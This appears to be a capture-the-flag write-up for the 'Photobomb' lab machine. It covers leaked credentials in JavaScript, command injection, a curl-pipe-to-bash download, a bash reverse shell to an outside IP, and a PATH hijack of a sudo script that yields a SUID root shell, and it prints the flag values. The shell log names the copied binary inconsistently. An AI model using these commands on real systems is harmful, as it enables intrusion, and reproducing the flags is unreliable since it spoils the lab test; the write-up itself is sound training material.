# Photobomp Machine

<img src=".github/photobomb.png">



## Enumeration

In the enumeration we can found the common ports 22 and 80
running the ssh and the http, nothing to be surprised.


<img src=".github/enumeration2.png"/>

Adding the ip in the ```/etc/hosts``` we can see the
following web page.

<img src=".github/enumeration1.png"/>

In the enpoints we can found the endpoint ```/printer```
that request for a user and password but with source 
coding we can see the Javascript file

```javascript
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```
So then the user _pH0t0_ and the password _b0Mb!_


so then we can see the another page

<img src=".github/enumeration3.png"/>


## Explotation
We see in the burpsuit that using the parameter type
we can inject commands getting a RCE
<img src=".github/explotation1.png"/>

<img src=".github/explotation2.png"/>


Now we can use a reverse shell to get a interactive shell uisng the parameter
as follow ```curl http://10.10.14.22 | bash```

and the html file
<img src=".github/explotation5.png"/>

```bash
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.22/443 0>&1'
```
<img src=".github/explotation3.png"/>

And after that, we can see the use flag

```bash
wizard@photobomb:~$ ls -la
total 44
drwxr-xr-x 7 wizard wizard 4096 Sep 16 15:14 .
drwxr-xr-x 3 root   root   4096 Sep 16 15:14 ..
lrwxrwxrwx 1 wizard wizard    9 Mar 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 wizard wizard  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 wizard wizard 3771 Feb 25  2020 .bashrc
drwx------ 2 wizard wizard 4096 Sep 16 15:14 .cache
drwxrwxr-x 4 wizard wizard 4096 Sep 16 15:14 .gem
drwx------ 3 wizard wizard 4096 Sep 16 15:14 .gnupg
drwxrwxr-x 3 wizard wizard 4096 Sep 16 15:14 .local
drwxrwxr-x 6 wizard wizard 4096 Sep 16 15:14 photobomb
-rw-r--r-- 1 wizard wizard  807 Feb 25  2020 .profile
-rw-r----- 1 wizard wizard   33 Oct 11 00:23 user.txt
wizard@photobomb:~$ cat user.txt 
348634b63a0f95e3149f62a150efaf28
```


## Post explotation (intrussion)


In this section, the post explotation, we can see the configuration
in the sudo permissions for the user wizard

```bash
wizard@photobomb:~$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
wizard@photobomb:~$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
wizard@photobomb:~$ 
```


Due this information, we can see that using the PATH value, we can change
the location for the executin the file called _find_
```
wizard@photobomb:~$ cat find
#!/bin/bash
cp /bin/bash /tmp/asd; chmod 4777 /tmp/asd



wizard@photobomb:~$ sudo PATH=/home/wizard:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin /opt/cleanup.sh
wizard@photobomb:~$ ls -la /tmp/dick
-rwsrwxrwx 1 root root 1183448 Oct 11 03:57 /tmp/dick
wizard@photobomb:~$ cd /tmp
wizard@photobomb:/tmp$ ./dick -p
dick-5.0# whoami
root
dick-5.0# cat /root/root.txt
791ca016c800b4ff5dd3a9d0ffed8605
dick-5.0# 
```

And getting a copy of the bash binary with the value SUID permissions and get the root
## Reporting